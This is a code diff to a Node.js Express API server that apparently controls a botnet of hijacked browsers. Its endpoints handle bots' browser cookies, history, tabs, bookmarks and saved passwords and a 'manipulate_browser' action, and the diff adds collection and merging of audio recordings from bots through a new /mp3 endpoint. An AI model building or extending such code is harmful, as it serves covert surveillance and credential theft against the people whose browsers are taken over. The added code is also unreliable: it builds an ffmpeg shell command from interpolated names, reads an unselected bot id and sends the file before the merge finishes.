@@ -1,6 +1,7 @@
 const copy = require("./utils.js").copy;
 const express = require("express");
 const bcrypt = require("bcrypt");
+const path = require("path");
 const uuid = require("uuid");
 const bodyParser = require("body-parser");
 const sessions = require("client-sessions");
@@ -9,6 +10,10 @@ const Users = database.Users;
 const Bots = database.Bots;
 const Settings = database.Settings;
 const sequelize = database.sequelize;
+const fs = require("fs");
+const { promisify } = require("util");
+const exec = promisify(require("child_process").exec);
+
 const Sequelize = require("sequelize");
 const Op = Sequelize.Op;
 const get_hashed_password = require("./utils.js").get_hashed_password;
@@ -35,6 +40,41 @@ function getMethods(obj) {
     }
   }
   return result;
+}
+
+
+async function mergeBase64MP3s(base64DataArray, outputFile) {
+  const tempFiles = [];
+
+  try {
+    // Decode and write each Base64 MP3 to a temporary file
+    for (let i = 0; i < base64DataArray.length; i++) {
+      const tempFileName = `temp_${i}.mp3`;
+      const base64Data = base64DataArray[i];
+      const binaryData = Buffer.from(base64Data, "base64");
+      fs.writeFileSync(tempFileName, binaryData);
+      tempFiles.push(tempFileName);
+    }
+
+    // Use FFmpeg to concatenate the temporary MP3 files
+    const fileList = tempFiles.map((file) => `file '${file}'`).join("\n");
+    const concatFile = "concat.txt";
+    fs.writeFileSync(concatFile, fileList);
+
+    await exec(
+      `ffmpeg -f concat -safe 0 -i ${concatFile} -c copy ${outputFile}`
+    );
+
+    console.log("MP3 files merged successfully.");
+  } catch (error) {
+    console.error("Error merging MP3 files:", error);
+  } finally {
+    // Clean up temporary files
+    for (const tempFile of tempFiles) {
+      fs.unlinkSync(tempFile);
+    }
+    fs.unlinkSync(concatFile);
+  }
 }
 
 async function get_api_server(proxy_utils) {
@@ -98,12 +138,6 @@ async function get_api_server(proxy_utils) {
       "/health",
       `${API_BASE_PATH}/login`,
       `${API_BASE_PATH}/verify-proxy-credentials`,
-      `${API_BASE_PATH}/get-bot-browser-cookies`,
-      `${API_BASE_PATH}/get-bot-browser-history`,
-      `${API_BASE_PATH}/get-bot-browser-tabs`,
-      `${API_BASE_PATH}/get-bot-browser-bookmarks`,
-      `${API_BASE_PATH}/get-bot-browser-password`,
-      `${API_BASE_PATH}/manipulate_browser`,
     ];
     if (ENDPOINTS_NOT_REQUIRING_AUTH.includes(req.originalUrl)) {
       next();
@@ -236,6 +270,7 @@ async function get_api_server(proxy_utils) {
         "history",
         "cookies",
         "downloads",
+        "recording",
         "state",
         "switch_config",
       ],
@@ -251,6 +286,26 @@ async function get_api_server(proxy_utils) {
       })
       .end();
   });
+
+  app.post(API_BASE_PATH + "/mp3", async (req, res) => {
+    const bot = await Bots.findOne({
+      where: {
+        id: req.body.bot_id,
+      },
+      attributes: ["recording"],
+    });
+
+    const filename = `${bot.id}.mp3`;
+
+    mergeBase64MP3s(
+      bot.recording.map((item) => item.data),
+      filename
+    );
+
+    const file = path.join(__dirname, filename);
+    res.sendFile(file);
+  });
+
 
   /*
         Log in to a given user account
